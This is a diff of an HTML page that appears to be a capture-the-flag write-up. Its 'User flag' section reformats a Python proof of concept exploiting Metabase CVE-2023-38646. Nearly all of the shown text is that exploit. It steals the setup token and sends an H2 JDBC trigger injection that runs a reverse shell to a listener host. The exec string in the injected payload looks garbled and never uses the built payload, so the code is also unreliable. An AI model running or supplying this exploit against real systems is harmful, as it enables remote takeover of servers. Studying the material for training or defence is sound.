@@ -85,107 +85,105 @@ Metabase has a vulnerability (CVE-2023-38646)
     <h2 id="2-user-flag">2: User flag</h2>
     <p><br /><br />
 Use this POC
-<br /><br />
-```python
-import requests
-import argparse
-import base64
-import json
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-from urllib.parse import urlparse</p>
+<br /><br /></p>
   </li>
 </ul>
 
-<p>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
 
-<p>def get_setup_token_and_version(ip_address):
-    endpoint = “/api/session/properties”
-    url = f”{ip_address}{endpoint}”
-    try:
-        print(f”[DEBUG] Fetching setup token from {url}”)
-        response = requests.get(url, verify=False)
-        if response.status_code == 200:
-            data = response.json()
-            setup_token = data.get(“setup-token”)
-            metabase_version = data.get(“version”, {}).get(“tag”)</p>
+<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        if setup_token is None:
-            print(f"[DEBUG] Setup token not found or is null for IP: {ip_address}\n")
-        else:
-            print(f"[DEBUG] Setup Token: {setup_token}")
-            print(f"[DEBUG] Version: {metabase_version}")
+<span class="k">def</span> <span class="nf">get_setup_token_and_version</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s">"/api/session/properties"</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ip_address</span><span class="si">}{</span><span class="n">endpoint</span><span class="si">}</span><span class="s">"</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Fetching setup token from </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
+            <span class="n">setup_token</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"setup-token"</span><span class="p">)</span>
+            <span class="n">metabase_version</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"version"</span><span class="p">,</span> <span class="p">{}).</span><span class="n">get</span><span class="p">(</span><span class="s">"tag"</span><span class="p">)</span>
 
-        return setup_token
-except requests.exceptions.RequestException as e:
-    print(f"[DEBUG] Exception occurred: {e}")
-    print(f"[DEBUG] Failed to connect to {ip_address}.\n")
-</code></pre></div></div>
+            <span class="k">if</span> <span class="n">setup_token</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Setup token not found or is null for IP: </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Setup Token: </span><span class="si">{</span><span class="n">setup_token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Version: </span><span class="si">{</span><span class="n">metabase_version</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-<p>def post_setup_validate(ip_address, setup_token, listener_ip, listener_port):
-    payload = base64.b64encode(f”bash -c ‘bash -i &gt;&amp;/dev/tcp/{listener_ip}/{listener_port} 0&gt;&amp;1’“.encode()).decode()</p>
+            <span class="k">return</span> <span class="n">setup_token</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Exception occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Failed to connect to </span><span class="si">{</span><span class="n">ip_address</span><span class="si">}</span><span class="s">.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print(f"[DEBUG] Payload = {payload}")
+<span class="k">def</span> <span class="nf">post_setup_validate</span><span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">setup_token</span><span class="p">,</span> <span class="n">listener_ip</span><span class="p">,</span> <span class="n">listener_port</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">f</span><span class="s">"bash -c 'bash -i &gt;&amp;/dev/tcp/</span><span class="si">{</span><span class="n">listener_ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">listener_port</span><span class="si">}</span><span class="s"> 0&gt;&amp;1'"</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
 
-endpoint = "/api/setup/validate"
-url = f"{ip_address}{endpoint}"
-headers = {'Content-Type': 'application/json'}
-data = {
-    "token": setup_token,
-    "details": {
-        "is_on_demand": False,
-        "is_full_sync": False,
-        "is_sample": False,
-        "cache_ttl": None,
-        "refingerprint": False,
-        "auto_run_queries": True,
-        "schedules": {},
-        "details": {
-            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c }||')\n$$--=x",
-            "advanced-options": False,
-            "ssl": True
-        },
-        "name": "test",
-        "engine": "h2"
-    }
-}
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Payload = </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-print(f"[DEBUG] Sending request to {url} with headers {headers} and data {json.dumps(data, indent=4)}")
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s">"/api/setup/validate"</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ip_address</span><span class="si">}{</span><span class="n">endpoint</span><span class="si">}</span><span class="s">"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"token"</span><span class="p">:</span> <span class="n">setup_token</span><span class="p">,</span>
+        <span class="s">"details"</span><span class="p">:</span> <span class="p">{</span>
+            <span class="s">"is_on_demand"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
+            <span class="s">"is_full_sync"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
+            <span class="s">"is_sample"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
+            <span class="s">"cache_ttl"</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
+            <span class="s">"refingerprint"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
+            <span class="s">"auto_run_queries"</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
+            <span class="s">"schedules"</span><span class="p">:</span> <span class="p">{},</span>
+            <span class="s">"details"</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s">"db"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1</span><span class="se">\\</span><span class="s">;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript</span><span class="se">\n</span><span class="s">java.lang.Runtime.getRuntime().exec('bash -c }||')</span><span class="se">\n</span><span class="s">$$--=x"</span><span class="p">,</span>
+                <span class="s">"advanced-options"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
+                <span class="s">"ssl"</span><span class="p">:</span> <span class="bp">True</span>
+            <span class="p">},</span>
+            <span class="s">"name"</span><span class="p">:</span> <span class="s">"test"</span><span class="p">,</span>
+            <span class="s">"engine"</span><span class="p">:</span> <span class="s">"h2"</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
 
-try:
-    response = requests.post(url, headers=headers, json=data, verify=False)
-    print(f"[DEBUG] Response received: {response.text}")
-    if response.status_code == 200:
-        print(f"[DEBUG] POST to {url} successful.\n")
-    else:
-        print(f"[DEBUG] POST to {url} failed with status code: {response.status_code}\n")
-except requests.exceptions.RequestException as e:
-    print(f"[DEBUG] Exception occurred: {e}")
-    print(f"[DEBUG] Failed to connect to {url}\n")
-</code></pre></div></div>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Sending request to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s"> with headers </span><span class="si">{</span><span class="n">headers</span><span class="si">}</span><span class="s"> and data </span><span class="si">{</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-<p>def preprocess_url(user_input):
-    parsed_url = urlparse(user_input)
-    protocol = f”{parsed_url.scheme}://” if parsed_url.scheme else “http://”
-    netloc = parsed_url.netloc or parsed_url.path
-    return protocol + netloc.rstrip(‘/’)</p>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Response received: </span><span class="si">{</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] POST to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s"> successful.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] POST to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s"> failed with status code: </span><span class="si">{</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Exception occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Failed to connect to </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:
-    parser = argparse.ArgumentParser(description=’Check setup token’)
-    parser.add_argument(‘–rhost’, type=str, help=’Metabase server IP address (including http:// or https:// and port number if needed)’)
-    parser.add_argument(‘–lhost’, type=str, help=’Listener IP address’)
-    parser.add_argument(‘–lport’, type=int, default=4444, help=’Listener port (default is 4444)’)
-    args = parser.parse_args()</p>
+<span class="k">def</span> <span class="nf">preprocess_url</span><span class="p">(</span><span class="n">user_input</span><span class="p">):</span>
+    <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
+    <span class="n">protocol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">parsed_url</span><span class="p">.</span><span class="n">scheme</span><span class="si">}</span><span class="s">://"</span> <span class="k">if</span> <span class="n">parsed_url</span><span class="p">.</span><span class="n">scheme</span> <span class="k">else</span> <span class="s">"http://"</span>
+    <span class="n">netloc</span> <span class="o">=</span> <span class="n">parsed_url</span><span class="p">.</span><span class="n">netloc</span> <span class="ow">or</span> <span class="n">parsed_url</span><span class="p">.</span><span class="n">path</span>
+    <span class="k">return</span> <span class="n">protocol</span> <span class="o">+</span> <span class="n">netloc</span><span class="p">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print(f"[DEBUG] Original rhost: {args.rhost}")
-args.rhost = preprocess_url(args.rhost)
-print(f"[DEBUG] Preprocessed rhost: {args.rhost}")
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Check setup token'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--rhost'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Metabase server IP address (including http:// or https:// and port number if needed)'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--lhost'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Listener IP address'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--lport'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">4444</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Listener port (default is 4444)'</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
 
-print(f"[DEBUG] Input Arguments - rhost: {args.rhost}, lhost: {args.lhost}, lport: {args.lport}")
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Original rhost: </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">args</span><span class="p">.</span><span class="n">rhost</span> <span class="o">=</span> <span class="n">preprocess_url</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Preprocessed rhost: </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
 
-setup_token = get_setup_token_and_version(args.rhost)
-print(f"[DEBUG] Setup token: {setup_token}")
-if setup_token:
-    post_setup_validate(args.rhost, setup_token, args.lhost, args.lport) ```
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Input Arguments - rhost: </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s">, lhost: </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">lhost</span><span class="si">}</span><span class="s">, lport: </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">lport</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">setup_token</span> <span class="o">=</span> <span class="n">get_setup_token_and_version</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[DEBUG] Setup token: </span><span class="si">{</span><span class="n">setup_token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">setup_token</span><span class="p">:</span>
+        <span class="n">post_setup_validate</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="p">,</span> <span class="n">setup_token</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">lhost</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">lport</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p><br /><br />
